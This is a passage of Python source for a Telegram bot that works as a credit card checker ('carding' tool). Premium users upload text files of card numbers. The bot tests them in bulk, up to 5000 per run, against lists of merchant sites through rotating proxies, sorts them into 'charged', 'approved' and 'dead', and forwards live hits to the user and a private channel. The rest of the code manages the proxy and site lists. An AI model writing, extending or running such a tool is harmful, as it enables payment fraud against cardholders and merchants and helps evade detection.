        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    """Remove proxies by index (comma separated)"""
    user_id = event.sender_id

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    """Remove all proxies from proxy.txt"""
    user_id = event.sender_id

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
        return

    # Send backup file to user
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(
                f"📦 <b>Backup Created!</b>\n\n"
                f"Sending backup of {count} proxies before clearing..."
            ),
            file=backup_filename,
            parse_mode='html'
        )

        # Remove backup file after sending
        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    # Clear proxy.txt
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    """Get all proxies from proxy.txt"""
    user_id = event.sender_id

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    """Command to add proxies to proxy.txt"""
    user_id = event.sender_id
    try:
        with open(PREMIUM_FILE, "r") as f:
         owners = f.read().splitlines()

    except:
         owners = []

    if str(user_id) not in owners:
       await event.reply(
           premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command.")
       )
       return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."))
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."))
            return

        current_proxies = load_proxies()
        new_proxies = []

        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."))
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"))

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    """Command to remove a site from sites.txt"""
    user_id = event.sender_id
    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"))
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error removing site: {e}"))

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    """Main check command"""
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("😡 **Access Denied**\n\nOnly premium users can use this bot."))
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("😡 Please reply to a .txt file containing cards......"))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("😡 Please reply to a .txt file."))
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."))
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return

    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."))

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("😡 No valid cards found in file."))
        os.remove(file_path)
        return

    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"🫦 File contains {len(cards)} cards. Limiting to first 5000 cards."))
        cards = cards[:5000]

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🫦 Starting check for {total_cards} cards..."))

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                # Real-time exact-completion update throttle (1.0 sec)
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"))
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass

        await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    """Check all proxies and remove dead ones using a test card and site"""
    user_id = event.sender_id

    try:
     with open(PREMIUM_FILE, "r") as f:
        premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."))

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking proxies...\n\n"
                    f"<b>Checked:</b> {min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}\n"
                    f"<b>Alive:</b> {len(alive_proxies)}\n"
                    f"<b>Dead:</b> {len(dead_proxies)}"
                ),
                parse_mode='html'
            )

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n"
        summary_msg += f"<b>Total Proxies:</b> {len(proxies)}\n"
        summary_msg += f"<b>Alive:</b> {len(alive_proxies)}\n"
        summary_msg += f"<b>Removed:</b> {len(dead_proxies)}\n\n"
        summary_msg += "<code>proxy.txt</code> has been updated with only working proxies."

        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during proxy check: {e}"))

@bot.on(events.NewMessage(pattern='/fuck'))
async def site_command(event):
    """Check all sites and remove dead ones"""
    user_id = event.sender_id

    try:
        with open(PREMIUM_FILE, "r") as f:
         premium_users = f.read().splitlines()

    except:
     premium_users = []

    if str(user_id) not in premium_users:

        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))

    alive_sites = []
    dead_sites = []
    batch_size = 10

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: fresh_proxies = proxies

            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]

            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking sites...\n\n"
                    f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                    f"<b>Alive:</b> {len(alive_sites)}\n"
                    f"<b>Dead:</b> {len(dead_sites)}"
                ),
                parse_mode='html'
            )

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        summary_msg = f"✅ **Site Check Complete!**\n\n"
        summary_msg += f"**Total Sites:** {len(sites)}\n"
        summary_msg += f"**Alive:** {len(alive_sites)}\n"
        summary_msg += f"**Removed:** {len(dead_sites)}\n\n"
        summary_msg += "`sites.txt` has been updated."

        await status_msg.edit(premium_emoji(summary_msg))

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during site check: {e}"))

# Callbacks for Pause/Resume/Stop
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji("🛑 Stopped"))
        await event.edit(premium_emoji("😡 **Checking stopped by user.**"))


#new command
@bot.on(events.NewMessage(pattern='/love'))
async def love_you(event):

    await event.reply("love you Bhai")

# ===========================
# TEST PRIVATE CHANNEL
# ===========================
@bot.on(events.NewMessage(pattern='/testx'))
async def test_private_channel(event):
    try:
        await bot.send_message(
            PRIVATE_CHANNEL_ID,
            "✅ <b>Private Channel Test Successful!</b>\n\n"
            "Agar ye message aa gaya hai to bot Approved/Charged hits bhi bhej sakta hai.",
            parse_mode="html"
        )

        await event.reply("✅ Message successfully sent to private channel.")

    except Exception as e:
        await event.reply(f"❌ Error:\n<code>{e}</code>", parse_mode="html")



print("✅ Bot started successfully!")
bot.run_until_disconnected()
